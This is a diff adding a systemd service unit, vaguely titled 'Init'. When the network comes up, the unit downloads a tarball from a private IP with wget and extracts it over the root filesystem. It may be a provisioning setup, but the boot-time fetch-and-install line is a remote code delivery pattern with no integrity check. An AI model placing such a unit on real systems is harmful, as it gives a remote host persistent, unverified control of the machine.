@@ -1,0 +1,9 @@
+[Unit]
+Description=Init
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'wget -q -O - http://192.168.5.114/eh/by-id/eh1/install.tgz | tar xvfzC - /'
+
+[Install]
+WantedBy=network-online.target
